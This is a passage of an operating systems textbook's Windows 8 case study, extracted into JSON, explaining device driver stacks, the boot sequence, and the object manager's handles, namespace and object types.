preallocated\r\ndata, there is no queuing of data as in message-based IPC—with all the attendant\r\nresource-management problems. Subscribers are guaranteed only that they can see\r\nthe latest version of a state instance.\r\nThis state-based approach gives WNF its principal advantage over other IPC\r\nmechanisms: publishers and subscribers are decoupled and can start and stop inde\u0002pendently of each other. Publishers need not execute at boot time just to initialize\r\ntheir state instances, as those can be persisted by the operating system across\r\nreboots. Subscribers generally need not be concerned about past values of state\r\ninstances when they start running, as all they should need to know about the state’s\r\nhistory is encapsulated in the current state. In scenarios where past state values\r\ncannot be reasonably encapsulated, the current state can provide metadata for man\u0002aging historical state, say, in a file or in a persisted section object used as a circular\r\nbuffer. WNF is part of the native NT APIs and is not (yet) exposed via Win32 in\u0002terfaces. But it is extensively used internally by the system to implement Win32\r\nand WinRT APIs.\r\nIn Windows NT 4.0, much of the code related to the Win32 graphical interface\r\nwas moved into the kernel because the then-current hardware could not provide the\r\nrequired performance. This code previously resided in the csrss.exe subsystem\r\nprocess which implemented the Win32 interfaces. The kernel-based GUI code\r\nresides in a special kernel-driver, win32k.sys. This change was expected to im\u0002prove Win32 performance because the extra user-mode/kernel-mode transitions\r\nand the cost of switching address spaces to implement communication via LPC\r\nwas eliminated. But it has not been as successful as expected because the re\u0002quirements on code running in the kernel are very strict, and the additional over\u0002head of running in kernel-mode offsets some of the gains from reducing switching\r\ncosts.\r\nThe Device Drivers\r\nThe final part of Fig. 11-11 consists of the device drivers. Device drivers in\r\nWindows are dynamic link libraries which are loaded by the NTOS executive.\r\nThough they are primarily used to implement the drivers for specific hardware,\r\nsuch as physical devices and I/O buses, the device-driver mechanism is also used\r\nas the general extensibility mechanism for kernel mode. As described above,\r\nmuch of the Win32 subsystem is loaded as a driver.\r\nThe I/O manager organizes a data flow path for each instance of a device, as\r\nshown in Fig. 11-14. This path is called a device stack and consists of private\r\ninstances of kernel device objects allocated for the path. Each device object in the\r\ndevice stack is linked to a particular driver object, which contains the table of\n892 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nroutines to use for the I/O request packets that flow through the device stack. In\r\nsome cases the devices in the stack represent drivers whose sole purpose is to filter\r\nI/O operations aimed at a particular device, bus, or network driver. Filtering is\r\nused for a number of reasons. Sometimes preprocessing or postprocessing I/O op\u0002erations results in a cleaner architecture, while other times it is just pragmatic be\u0002cause the sources or rights to modify a driver are not available and so filtering is\r\nused to work around the inability to modify those drivers. Filters can also imple\u0002ment completely new functionality, such as turning disks into partitions or multiple\r\ndisks into RAID volumes.\r\nC: File-system Filter \r\nC: File-system Filter\r\nC: File system \r\nC: Volume\r\nC: Disk class device\r\nC: Disk partition(s)\r\nIRP\r\nFile-system filter driver \r\nFile-system filter driver \r\nNTFS driver \r\nVolume manager driver \r\nDisk class driver \r\nDisk miniport driver \r\nD: File-system filter\r\nD: File-system filter\r\nD: File system\r\nD: Volume\r\nD: Disk class device\r\nD: Disk partition(s)\r\nIRP\r\nDevice stack\r\nconsisting of device\r\nobjects for C:\r\nDevice stack\r\nconsisting of device\r\nobjects for D:\r\nEach device object\r\nlinks to a driver\r\nobject with function\r\nentry points\r\nI/O manager\r\nFigure 11-14. Simplified depiction of device stacks for two NTFS file volumes.\r\nThe I/O request packet is passed from down the stack. The appropriate routines\r\nfrom the associated drivers are called at each level in the stack. The device stacks\r\nthemselves consist of device objects allocated specifically to each stack.\r\nThe file systems are loaded as device drivers. Each instance of a volume for a\r\nfile system has a device object created as part of the device stack for that volume.\r\nThis device object will be linked to the driver object for the file system appropriate\r\nto the volume’s formatting. Special filter drivers, called file-system filter drivers,\r\ncan insert device objects before the file-system device object to apply functionality\r\nto the I/O requests being sent to each volume, such as inspecting data read or writ\u0002ten for viruses.\nSEC. 11.3 SYSTEM STRUCTURE 893\r\nThe network protocols, such as Windows’ integrated IPv4/IPv6 TCP/IP imple\u0002mentation, are also loaded as drivers using the I/O model. For compatibility with\r\nthe older MS-DOS-based Windows, the TCP/IP driver implements a special proto\u0002col for talking to network interfaces on top of the Windows I/O model. There are\r\nother drivers that also implement such arrangements, which Windows calls mini\u0002ports. The shared functionality is in a class driver. For example, common func\u0002tionality for SCSI or IDE disks or USB devices is supplied by a class driver, which\r\nminiport drivers for each particular type of such devices link to as a library.\r\nWe will not discuss any particular device driver in this chapter, but will provide\r\nmore detail about how the I/O manager interacts with device drivers in Sec. 11.7."
          },
          "11.3.2 Booting Windows": {
            "page": 924,
            "content": "11.3.2 Booting Windows\r\nGetting an operating system to run requires several steps. When a computer is\r\nturned on, the first processor is initialized by the hardware, and then set to start ex\u0002ecuting a program in memory. The only available code is in some form of non\u0002volatile CMOS memory that is initialized by the computer manufacturer (and\r\nsometimes updated by the user, in a process called flashing). Because the software\r\npersists in memory, and is only rarely updated, it is referred to as firmware. The\r\nfirmware is loaded on PCs by the manufacturer of either the parentboard or the\r\ncomputer system. Historically PC firmware was a program called BIOS (Basic\r\nInput/Output System), but most new computers use UEFI (Unified Extensible\r\nFirmware Interface). UEFI improves over BIOS by supporting modern hard\u0002ware, providing a more modular CPU-independent architecture, and supporting an\r\nextension model which simplifies booting over networks, provisioning new ma\u0002chines, and running diagnostics.\r\nThe main purpose of any firmware is to bring up the operating system by first\r\nloading small bootstrap programs found at the beginning of the disk-drive parti\u0002tions. The Windows bootstrap programs know how to read enough information off\r\na file-system volume or network to find the stand-alone Windows BootMgr pro\u0002gram. BootMgr determines if the system had previously been hibernated or was in\r\nstand-by mode (special power-saving modes that allow the system to turn back on\r\nwithout restarting from the beginning of the bootstrap process). If so, BootMgr\r\nloads and executes WinResume.exe. Otherwise it loads and executes WinLoad.exe\r\nto perform a fresh boot. WinLoad loads the boot components of the system into\r\nmemory: the kernel/executive (normally ntoskrnl.exe), the HAL (hal.dll), the file\r\ncontaining the SYSTEM hive, the Win32k.sys driver containing the kernel-mode\r\nparts of the Win32 subsystem, as well as images of any other drivers that are listed\r\nin the SYSTEM hive as boot drivers—meaning they are needed when the system\r\nfirst boots. If the system has Hyper-V enabled, WinLoad also loads and starts the\r\nhypervisor program.\r\nOnce the Windows boot components have been loaded into memory, control is\r\nhanded over to the low-level code in NTOS which proceeds to initialize the HAL,\n894 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nkernel, and executive layers, link in the driver images, and access/update configu\u0002ration data in the SYSTEM hive. After all the kernel-mode components are ini\u0002tialized, the first user-mode process is created using for running the smss.exe pro\u0002gram (which is like /etc/init in UNIX systems).\r\nRecent versions of Windows provide support for improving the security of the\r\nsystem at boot time. Many newer PCs contain a TPM (Trusted Platform Mod\u0002ule), which is chip on the parentboard. chip is a secure cryptographic processor\r\nwhich protects secrets, such as encryption/decryption keys. The system’s TPM can\r\nbe used to protect system keys, such as those used by BitLocker to encrypt the\r\ndisk. Protected keys are not revealed to the operating system until after TPM has\r\nverified that an attacker has not tampered with them. It can also provide other\r\ncryptographic functions, such as attesting to remote systems that the operating sys\u0002tem on the local system had not been compromised.\r\nThe Windows boot programs have logic to deal with common problems users\r\nencounter when booting the system fails. Sometimes installation of a bad device\r\ndriver, or running a program like regedit (which can corrupt the SYSTEM hive),\r\nwill prevent the system from booting normally. There is support for ignoring re\u0002cent changes and booting to the last known good configuration of the system.\r\nOther boot options include safe-boot, which turns off many optional drivers, and\r\nthe recovery console, which fires up a cmd.exe command-line window, providing\r\nan experience similar to single-user mode in UNIX.\r\nAnother common problem for users has been that occasionally some Windows\r\nsystems appear to be very flaky, with frequent (seemingly random) crashes of both\r\nthe system and applications. Data taken from Microsoft’s Online Crash Analysis\r\nprogram provided evidence that many of these crashes were due to bad physical\r\nmemory, so the boot process in Windows provides the option of running an exten\u0002sive memory diagnostic. Perhaps future PC hardware will commonly support ECC\r\n(or maybe parity) for memory, but most of the desktop, notebook, and handheld\r\nsystems today are vulnerable to even single-bit errors in the tens of billions of\r\nmemory bits they contain."
          },
          "11.3.3 Implementation of the Object Manager": {
            "page": 925,
            "content": "11.3.3 Implementation of the Object Manager\r\nThe object manager is probably the single most important component in the\r\nWindows executive, which is why we hav e already introduced many of its con\u0002cepts. As described earlier, it provides a uniform and consistent interface for man\u0002aging system resources and data structures, such as open files, processes, threads,\r\nmemory sections, timers, devices, drivers, and semaphores. Even more specialized\r\nobjects representing things like kernel transactions, profiles, security tokens, and\r\nWin32 desktops are managed by the object manager. Device objects link together\r\nthe descriptions of the I/O system, including providing the link between the NT\r\nnamespace and file-system volumes. The configuration manager uses an object of\r\ntype key to link in the registry hives. The object manager itself has objects it uses\nSEC. 11.3 SYSTEM STRUCTURE 895\r\nto manage the NT namespace and implement objects using a common facility.\r\nThese are directory, symbolic link, and object-type objects.\r\nThe uniformity provided by the object manager has various facets. All these\r\nobjects use the same mechanism for how they are created, destroyed, and ac\u0002counted for in the quota system. They can all be accessed from user-mode proc\u0002esses using handles. There is a unified convention for managing pointer references\r\nto objects from within the kernel. Objects can be given names in the NT name\u0002space (which is managed by the object manager). Dispatcher objects (objects that\r\nbegin with the common data structure for signaling events) can use common syn\u0002chronization and notification interfaces, like WaitForMultipleObjects. There is the\r\ncommon security system with ACLs enforced on objects opened by name, and ac\u0002cess checks on each use of a handle. There are even facilities to help kernel-mode\r\ndevelopers debug problems by tracing the use of objects.\r\nA key to understanding objects is to realize that an (executive) object is just a\r\ndata structure in the virtual memory accessible to kernel mode. These data struc\u0002tures are commonly used to represent more abstract concepts. As examples, exec\u0002utive file objects are created for each instance of a file-system file that has been\r\nopened. Process objects are created to represent each process.\r\nA consequence of the fact that objects are just kernel data structures is that\r\nwhen the system is rebooted (or crashes) all objects are lost. When the system\r\nboots, there are no objects present at all, not even the object-type descriptors. All\r\nobject types, and the objects themselves, have to be created dynamically by other\r\ncomponents of the executive layer by calling the interfaces provided by the object\r\nmanager. When objects are created and a name is specified, they can later be refer\u0002enced through the NT namespace. So building up the objects as the system boots\r\nalso builds the NT namespace.\r\nObjects have a structure, as shown in Fig. 11-15. Each object contains a head\u0002er with certain information common to all objects of all types. The fields in this\r\nheader include the object’s name, the object directory in which it lives in the NT\r\nnamespace, and a pointer to a security descriptor representing the ACL for the ob\u0002ject.\r\nThe memory allocated for objects comes from one of two heaps (or pools) of\r\nmemory maintained by the executive layer. There are (malloc-like) utility func\u0002tions in the executive that allow kernel-mode components to allocate either page\u0002able or nonpageable kernel memory. Nonpageable memory is required for any\r\ndata structure or kernel-mode object that might need to be accessed from a CPU\r\npriority level of 2 or more. This includes ISRs and DPCs (but not APCs) and the\r\nthread scheduler itself. The page-fault handler also requires its data structures to\r\nbe allocated from nonpageable kernel memory to avoid recursion.\r\nMost allocations from the kernel heap manager are achieved using per-proc\u0002essor lookaside lists which contain LIFO lists of allocations the same size. These\r\nLIFOs are optimized for lock-free operation, improving the performance and\r\nscalability of the system.\n896 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nObject\r\nheader\r\nObject\r\ndata Object-specific data\r\nObject name\r\nDirectory in which the object lives\r\nSecurity information (which can use object)\r\nQuota charges (cost to use the object)\r\nList of processes with handles\r\nReference counts\r\nPointer to the type object Type name\r\nAccess types\r\nAccess rights\r\nQuota charges\r\nSynchronizable?\r\nPageable\r\nOpen method\r\nClose method\r\nDelete method\r\nQuery name method\r\nParse method\r\nSecurity method\r\nFigure 11-15. Structure of an executive object managed by the object manager\r\nEach object header contains a quota-charge field, which is the charge levied\r\nagainst a process for opening the object. Quotas are used to keep a user from using\r\ntoo many system resources. There are separate limits for nonpageable kernel\r\nmemory (which requires allocation of both physical memory and kernel virtual ad\u0002dresses) and pageable kernel memory (which uses up kernel virtual addresses).\r\nWhen the cumulative charges for either memory type hit the quota limit, alloca\u0002tions for that process fail due to insufficient resources. Quotas also are used by the\r\nmemory manager to control working-set size, and by the thread manager to limit\r\nthe rate of CPU usage.\r\nBoth physical memory and kernel virtual addresses are valuable resources.\r\nWhen an object is no longer needed, it should be removed and its memory and ad\u0002dresses reclaimed. But if an object is reclaimed while it is still in use, then the\r\nmemory may be allocated to another object, and then the data structures are likely\r\nto become corrupted. It is easy for this to happen in the Windows executive layer\r\nbecause it is highly multithreaded, and implements many asynchronous operations\r\n(functions that return to their caller before completing work on the data structures\r\npassed to them).\r\nTo avoid freeing objects prematurely due to race conditions, the object man\u0002ager implements a reference counting mechanism and the concept of a referenced\r\npointer. A referenced pointer is needed to access an object whenever that object is\r\nin danger of being deleted. Depending on the conventions regarding each particu\u0002lar object type, there are only certain times when an object might be deleted by an\u0002other thread. At other times the use of locks, dependencies between data struc\u0002tures, and even the fact that no other thread has a pointer to an object are sufficient\r\nto keep the object from being prematurely deleted.\nSEC. 11.3 SYSTEM STRUCTURE 897\r\nHandles\r\nUser-mode references to kernel-mode objects cannot use pointers because they\r\nare too difficult to validate. Instead, kernel-mode objects must be named in some\r\nother way so the user code can refer to them. Windows uses handles to refer to\r\nkernel-mode objects. Handles are opaque values which are converted by the object\r\nmanager into references to the specific kernel-mode data structure representing an\r\nobject. Figure 11-16 shows the handle-table data structure used to translate hand\u0002les into object pointers. The handle table is expandable by adding extra layers of\r\nindirection. Each process has its own table, including the system process which\r\ncontains all the kernel threads not associated with a user-mode process.\r\nTable pointer\r\nA: Handle-table entries [512]\r\nHandle-table\r\ndescriptor\r\nObject\r\nObject\r\nObject\r\nFigure 11-16. Handle table data structures for a minimal table using a single\r\npage for up to 512 handles.\r\nFigure 11-17 shows a handle table with two extra levels of indirection, the\r\nmaximum supported. It is sometimes convenient for code executing in kernel\r\nmode to be able to use handles rather than referenced pointers. These are called\r\nkernel handles and are specially encoded so that they can be distinguished from\r\nuser-mode handles. Kernel handles are kept in the system processes’ handle table\r\nand cannot be accessed from user mode. Just as most of the kernel virtual address\r\nspace is shared across all processes, the system handle table is shared by all kernel\r\ncomponents, no matter what the current user-mode process is.\r\nUsers can create new objects or open existing objects by making Win32 calls\r\nsuch as CreateSemaphore or OpenSemaphore. These are calls to library proce\u0002dures that ultimately result in the appropriate system calls being made. The result\r\nof any successful call that creates or opens an object is a 64-bit handle-table entry\r\nthat is stored in the process’ private handle table in kernel memory. The 32-bit\r\nindex of the handle’s logical position in the table is returned to the user to use on\r\nsubsequent calls. The 64-bit handle-table entry in the kernel contains two 32-bit\r\nwords. One word contains a 29-bit pointer to the object’s header. The low-order 3\r\nbits are used as flags (e.g., whether the handle is inherited by processes it creates).\r\nThese 3 bits are masked off before the pointer is followed. The other word con\u0002tains a 32-bit rights mask. It is needed because permissions checking is done only\n898 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nA: Handle-table entries [512]\r\nB: Handle-table pointers [1024]\r\nC:Handle-table entries [512]\r\nD: Handle-table pointers [32]\r\nE: Handle-table pointers [1024]\r\nF:Handle-table entries [512]\r\nTable pointer\r\nHandle-table\r\nDescriptor\r\nObject\r\nObject\r\nObject\r\nFigure 11-17. Handle-table data structures for a maximal table of up to 16 mil\u0002lion handles.\r\nat the time the object is created or opened. If a process has only read permission to\r\nan object, all the other rights bits in the mask will be 0s, giving the operating sys\u0002tem the ability to reject any operation on the object other than reads.\r\nThe Object Namespace\r\nProcesses can share objects by having one process duplicate a handle to the ob\u0002ject into the others. But this requires that the duplicating process have handles to\r\nthe other processes, and is thus impractical in many situations, such as when the\r\nprocesses sharing an object are unrelated, or are protected from each other. In\r\nother cases it is important that objects persist even when they are not being used by\r\nany process, such as device objects representing physical devices, or mounted vol\u0002umes, or the objects used to implement the object manager and the NT namespace\r\nitself. To address general sharing and persistence requirements, the object man\u0002ager allows arbitrary objects to be given names in the NT namespace when they are\r\ncreated. However, it is up to the executive component that manipulates objects of a\r\nparticular type to provide interfaces that support use of the object manager’s na\u0002ming facilities.\r\nThe NT namespace is hierarchical, with the object manager implementing di\u0002rectories and symbolic links. The namespace is also extensible, allowing any ob\u0002ject type to specify extensions of the namespace by specifying a Parse routine.\r\nThe Parse routine is one of the procedures that can be supplied for each object type\r\nwhen it is created, as shown in Fig. 11-18.\r\nThe Open procedure is rarely used because the default object-manager behav\u0002ior is usually what is needed and so the procedure is specified as NULL for almost\r\nall object types.\nSEC. 11.3 SYSTEM STRUCTURE 899\r\nProcedure When called Notes\r\nOpen For every new handle Rarely used\r\nParse For object types that extend the namespace Used for files and registry keys\r\nClose At last handle close Clean up visible side effects\r\nDelete At last pointer dereference Object is about to be deleted\r\nSecur ity Get or set object’s secur ity descr iptor Protection\r\nQuer yName Get object’s name Rarely used outside ker nel\r\nFigure 11-18. Object procedures supplied when specifying a new object type.\r\nThe Close and Delete procedures represent different phases of being done with\r\nan object. When the last handle for an object is closed, there may be actions neces\u0002sary to clean up the state and these are performed by the Close procedure. When\r\nthe final pointer reference is removed from the object, the Delete procedure is call\u0002ed so that the object can be prepared to be deleted and have its memory reused.\r\nWith file objects, both of these procedures are implemented as callbacks into the\r\nI/O manager, which is the component that declared the file object type. The ob\u0002ject-manager operations result in I/O operations that are sent down the device stack\r\nassociated with the file object; the file system does most of the work.\r\nThe Parse procedure is used to open or create objects, like files and registry\r\nkeys, that extend the NT namespace. When the object manager is attempting to\r\nopen an object by name and encounters a leaf node in the part of the namespace it\r\nmanages, it checks to see if the type for the leaf-node object has specified a Parse\r\nprocedure. If so, it invokes the procedure, passing it any unused part of the path\r\nname. Again using file objects as an example, the leaf node is a device object\r\nrepresenting a particular file-system volume. The Parse procedure is implemented\r\nby the I/O manager, and results in an I/O operation to the file system to fill in a file\r\nobject to refer to an open instance of the file that the path name refers to on the\r\nvolume. We will explore this particular example step-by-step below.\r\nThe QueryName procedure is used to look up the name associated with an ob\u0002ject. The Security procedure is used to get, set, or delete the security descriptors\r\non an object. For most object types this procedure is supplied as a standard entry\r\npoint in the executive’s security reference monitor component.\r\nNote that the procedures in Fig. 11-18 do not perform the most useful opera\u0002tions for each type of object, such as read or write on files (or down and up on\r\nsemaphores). Rather, the object manager procedures supply the functions needed\r\nto correctly set up access to objects and then clean up when the system is finished\r\nwith them. The objects are made useful by the APIs that operate on the data struc\u0002tures the objects contain. System calls, like NtReadFile and NtWr iteFile, use the\r\nprocess’ handle table created by the object manager to translate a handle into a ref\u0002erenced pointer on the underlying object, such as a file object, which contains the\r\ndata that is needed to implement the system calls.\n900 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nApart from the object-type callbacks, the object manager also provides a set of\r\ngeneric object routines for operations like creating objects and object types, dupli\u0002cating handles, getting a referenced pointer from a handle or name, adding and\r\nsubtracting reference counts to the object header, and NtClose (the generic function\r\nthat closes all types of handles).\r\nAlthough the object namespace is crucial to the entire operation of the system,\r\nfew people know that it even exists because it is not visible to users without special\r\nviewing tools. One such viewing tool is winobj, available for free at the URL\r\nwww.microsoft.com/technet/sysinternals. When run, this tool depicts an object\r\nnamespace that typically contains the object directories listed in Fig. 11-19 as well\r\nas a few others.\r\nDirector y Contents\r\n\\?? Starting place for looking up MS-DOS devices like C:\r\n\\ DosDevices Official name of \\ ??, but really just a symbolic link to \\ ??\r\n\\Device All discovered I/O devices\r\n\\Dr iver Objects corresponding to each loaded device driver\r\n\\ObjectTypes The type objects such as those listed in Fig. 11-21\r\n\\Windows Objects for sending messages to all the Win32 GUI windows\r\n\\BaseNamedObjects User-created Win32 objects such as semaphores, mutexes, etc.\r\n\\Arcname Par tition names discovered by the boot loader\r\n\\NLS National Language Support objects\r\n\\FileSystem File-system dr iver objects and file system recognizer objects\r\n\\Secur ity Objects belonging to the security system\r\n\\KnownDLLs Key shared librar ies that are opened early and held open\r\nFigure 11-19. Some typical directories in the object namespace.\r\nThe strangely named directory \\ ?? contains the names of all the MS-DOS\u0002style device names, such as A: for the floppy disk and C: for the first hard disk.\r\nThese names are actually symbolic links to the directory \\ Device where the device\r\nobjects live. The name \\ ?? was chosen to make it alphabetically first so as to\r\nspeed up lookup of all path names beginning with a drive letter. The contents of\r\nthe other object directories should be self explanatory.\r\nAs described above, the object manager keeps a separate handle count in every\r\nobject. This count is never larger than the referenced pointer count because each\r\nvalid handle has a referenced pointer to the object in its handle-table entry. The\r\nreason for the separate handle count is that many types of objects may need to have\r\ntheir state cleaned up when the last user-mode reference disappears, even though\r\nthey are not yet ready to have their memory deleted.\r\nOne example is file objects, which represent an instance of an opened file. In\r\nWindows, files can be opened for exclusive access. When the last handle for a file\nSEC. 11.3 SYSTEM STRUCTURE 901\r\nobject is closed it is important to delete the exclusive access at that point rather\r\nthan wait for any incidental kernel references to eventually go away (e.g., after the\r\nlast flush of data from memory). Otherwise closing and reopening a file from user\r\nmode may not work as expected because the file still appears to be in use.\r\nThough the object manager has comprehensive mechanisms for managing ob\u0002ject lifetimes within the kernel, neither the NT APIs nor the Win32 APIs provide a\r\nreference mechanism for dealing with the use of handles across multiple concur\u0002rent threads in user mode. Thus, many multithreaded applications have race condi\u0002tions and bugs where they will close a handle in one thread before they are finished\r\nwith it in another. Or they may close a handle multiple times, or close a handle\r\nthat another thread is still using and reopen it to refer to a different object.\r\nPerhaps the Windows APIs should have been designed to require a close API\r\nper object type rather than the single generic NtClose operation. That would have\r\nat least reduced the frequency of bugs due to user-mode threads closing the wrong\r\nhandles. Another solution might be to embed a sequence field in each handle in\r\naddition to the index into the handle table.\r\nTo help application writers find problems like these in their programs, Win\u0002dows has an application verifier that software developers can download from\r\nMicrosoft. Similar to the verifier for drivers we will describe in Sec. 11.7, the ap\u0002plication verifier does extensive rules checking to help programmers find bugs that\r\nmight not be found by ordinary testing. It can also turn on a FIFO ordering for the\r\nhandle free list, so that handles are not reused immediately (i.e., turns off the bet\u0002ter-performing LIFO ordering normally used for handle tables). Keeping handles\r\nfrom being reused quickly transforms situations where an operation uses the wrong\r\nhandle into use of a closed handle, which is easy to detect.\r\nThe device object is one of the most important and versatile kernel-mode ob\u0002jects in the executive. The type is specified by the I/O manager, which along with\r\nthe device drivers, are the primary users of device objects. Device objects are\r\nclosely related to drivers, and each device object usually has a link to a specific\r\ndriver object, which describes how to access the I/O processing routines for the\r\ndriver corresponding to the device.\r\nDevice objects represent hardware devices, interfaces, and buses, as well as\r\nlogical disk partitions, disk volumes, and even file systems and kernel extensions\r\nlike antivirus filters. Many device drivers are given names, so they can be accessed\r\nwithout having to open handles to instances of the devices, as in UNIX. We will\r\nuse device objects to illustrate how the Parse procedure is used, as illustrated in\r\nFig. 11-20:\r\n1. When an executive component, such as the I/O manager imple\u0002menting the native system call NtCreateFile, calls ObOpenObjectBy\u0002Name in the object manager, it passes a Unicode path name for the\r\nNT namespace, say \\ ?? \\ C: \\ foo \\ bar.\n902 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nNtCreateFile(\\??\\C:\\foo\\bar)\r\nIoCallDriver\r\nIRP\r\nFile system filters\r\nWin32 CreateFile(C:\\foo\\bar)\r\nOpenObjectByName(\\??\\C:\\foo\\bar)\r\nI/O\r\nmanager\r\nI/O\r\nmanager\r\nObject\r\nmanager\r\nIopParseDevice(DeviceObject,\\foo\\bar)\r\nC: s Device stack\r\nNTFS\r\nNtfsCreateFile()\r\n(5)\r\nIoCallDriver\r\nIoCompleteRequest\r\nUser mode\r\nKernel mode\r\n\\\r\n(a) (b)\r\n(1)\r\nDevices\r\n??\r\nC:\r\nHarddisk1\r\nSYMLINK:\r\n\\Devices\\Harddisk1\r\nDEVICE OBJECT:\r\nfor C: Volume\r\n(3) (2)\r\n(4)\r\n(6)\r\n(7) (8)\r\n(9)\r\n(10)\r\n(5)\r\nHandle\r\nFile\r\nobject\r\nFigure 11-20. I/O and object manager steps for creating/opening a file and get\u0002ting back a file handle.\r\n2. The object manager searches through directories and symbolic links\r\nand ultimately finds that \\ ?? \\ C: refers to a device object (a type de\u0002fined by the I/O manager). The device object is a leaf node in the part\r\nof the NT namespace that the object manager manages.\r\n3. The object manager then calls the Parse procedure for this object\r\ntype, which happens to be IopParseDevice implemented by the I/O\r\nmanager. It passes not only a pointer to the device object it found (for\r\nC:), but also the remaining string \\ foo \\ bar.\r\n4. The I/O manager will create an IRP (I/O Request Packet), allocate a\r\nfile object, and send the request to the stack of I/O devices determined\r\nby the device object found by the object manager.\r\n5. The IRP is passed down the I/O stack until it reaches a device object\r\nrepresenting the file-system instance for C:. At each stage, control is\r\npassed to an entry point into the driver object associated with the de\u0002vice object at that level. The entry point used here is for CREATE\r\noperations, since the request is to create or open a file named\r\n\\ foo \\ bar on the volume.\nSEC. 11.3 SYSTEM STRUCTURE 903\r\n6. The device objects encountered as the IRP heads toward the file sys\u0002tem represent file-system filter drivers, which may modify the I/O op\u0002eration before it reaches the file-system device object. Typically\r\nthese intermediate devices represent system extensions like antivirus\r\nfilters.\r\n7. The file-system device object has a link to the file-system driver ob\u0002ject, say NTFS. So, the driver object contains the address of the\r\nCREATE operation within NTFS.\r\n8. NTFS will fill in the file object and return it to the I/O manager,\r\nwhich returns back up through all the devices on the stack until Iop\u0002ParseDevice returns to the object manager (see Sec. 11.8).\r\n9. The object manager is finished with its namespace lookup. It re\u0002ceived back an initialized object from the Parse routine (which hap\u0002pens to be a file object—not the original device object it found). So\r\nthe object manager creates a handle for the file object in the handle\r\ntable of the current process, and returns the handle to its caller.\r\n10. The final step is to return back to the user-mode caller, which in this\r\nexample is the Win32 API CreateFile, which will return the handle to\r\nthe application.\r\nExecutive components can create new types dynamically, by calling the\r\nObCreateObjectType interface to the object manager. There is no definitive list of\r\nobject types and they change from release to release. Some of the more common\r\nones in Windows are listed in Fig. 11-21. Let us briefly go over the object types in\r\nthe figure.\r\nProcess and thread are obvious. There is one object for every process and\r\nev ery thread, which holds the main properties needed to manage the process or\r\nthread. The next three objects, semaphore, mutex, and event, all deal with\r\ninterprocess synchronization. Semaphores and mutexes work as expected, but with\r\nvarious extra bells and whistles (e.g., maximum values and timeouts). Events can\r\nbe in one of two states: signaled or nonsignaled. If a thread waits on an event that\r\nis in signaled state, the thread is released immediately. If the event is in nonsig\u0002naled state, it blocks until some other thread signals the event, which releases ei\u0002ther all blocked threads (notification events) or just the first blocked thread (syn\u0002chronization events). An ev ent can also be set up so that after a signal has been\r\nsuccessfully waited for, it will automatically revert to the nonsignaled state, rather\r\nthan staying in the signaled state.\r\nPort, timer, and queue objects also relate to communication and synchroniza\u0002tion. Ports are channels between processes for exchanging LPC messages. Timers\n904 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nType Description\r\nProcess User process\r\nThread Thread within a process\r\nSemaphore Counting semaphore used for interprocess synchronization\r\nMutex Binar y semaphore used to enter a critical region\r\nEvent Synchronization object with persistent state (signaled/not)\r\nALPC port Mechanism for interprocess message passing\r\nTimer Object allowing a thread to sleep for a fixed time interval\r\nQueue Object used for completion notification on asynchronous I/O\r\nOpen file Object associated with an open file\r\nAccess token Security descriptor for some object\r\nProfile Data str ucture used for profiling CPU usage\r\nSection Object used for representing mappable files\r\nKe y Registr y key, used to attach registry to object-manager namespace\r\nObject directory Director y for grouping objects within the object manager\r\nSymbolic link Refers to another object manager object by path name\r\nDevice I/O device object for a physical device, bus, driver, or volume instance\r\nDevice driver Each loaded device driver has its own object\r\nFigure 11-21. Some common executive object types managed by the object\r\nmanager.\r\nprovide a way to block for a specific time interval. Queues (known internally as\r\nKQUEUES) are used to notify threads that a previously started asynchronous I/O\r\noperation has completed or that a port has a message waiting. Queues are designed\r\nto manage the level of concurrency in an application, and are also used in high-per\u0002formance multiprocessor applications, like SQL.\r\nOpen file objects are created when a file is opened. Files that are not opened\r\ndo not have objects managed by the object manager. Access tokens are security\r\nobjects. They identify a user and tell what special privileges the user has, if any.\r\nProfiles are structures used for storing periodic samples of the program counter of\r\na running thread to see where the program is spending its time.\r\nSections are used to represent memory objects that applications can ask the\r\nmemory manager to map into their address space. They record the section of the\r\nfile (or page file) that represents the pages of the memory object when they are on\r\ndisk. Keys represent the mount point for the registry namespace on the object\r\nmanager namespace. There is usually only one key object, named \\ REGISTRY,\r\nwhich connects the names of the registry keys and values to the NT namespace.\r\nObject directories and symbolic links are entirely local to the part of the NT\r\nnamespace managed by the object manager. They are similar to their file system\r\ncounterparts: directories allow related objects to be collected together. Symbolic\nSEC. 11.3 SYSTEM STRUCTURE 905\r\nlinks allow a name in one part of the object namespace to refer to an object in a\r\ndifferent part of the object namespace.\r\nEach device known to the operating system has one or more device objects that\r\ncontain information about it and are used to refer to the device by the system.\r\nFinally, each device driver that has been loaded has a driver object in the object\r\nspace. The driver objects are shared by all the device objects that represent\r\ninstances of the devices controlled by those drivers.\r\nOther objects (not shown) have more specialized purposes, such as interacting\r\nwith kernel transactions, or the Win32 thread pool’s worker thread factory."
          },
          "11.3.4 Subsystems, DLLs, and User-Mode Services": {
            "page": 936,
            "content": "11.3.4 Subsystems, DLLs, and User-Mode Services\r\nGoing back to Fig. 11-4, we see that the Windows operating system consists of\r\ncomponents in kernel mode and components in user mode. We hav e now com\u0002pleted our overview of the kernel-mode components; so it is time to look at the\r\nuser-mode components, of which three kinds are particularly important to Win\u0002dows: environment subsystems, DLLs, and service processes.\r\nWe hav e already described the Windows subsystem model; we will not go into\r\nmore detail now other than to mention that in the original design of NT, subsys\u0002tems were seen as a way of supporting multiple operating system personalities with\r\nthe same underlying software running in kernel mode. Perhaps this was an attempt\r\nto avoid having operating systems compete for the same platform, as VMS and\r\nBerkeley UNIX did on DEC’s VAX. Or maybe it was just that nobody at Micro\u0002soft knew whether OS/2 would be a success as a programming interface, so they\r\nwere hedging their bets. In any case, OS/2 became irrelevant, and a latecomer, the\r\nWin32 API designed to be shared with Windows 95, became dominant.\r\nA second key aspect of the user-mode design of Windows is the dynamic link\r\nlibrary (DLL) which is code that is linked to executable programs at run time rath\u0002er than compile time. Shared libraries are not a new concept, and most modern op\u0002erating systems use them. In Windows, almost all libraries are DLLs, from the\r\nsystem library ntdll.dll that is loaded into every process to the high-level libraries\r\nof common functions that are intended to allow rampant code-reuse by application\r\ndevelopers.\r\nDLLs improve the efficiency of the system by allowing common code to be\r\nshared among 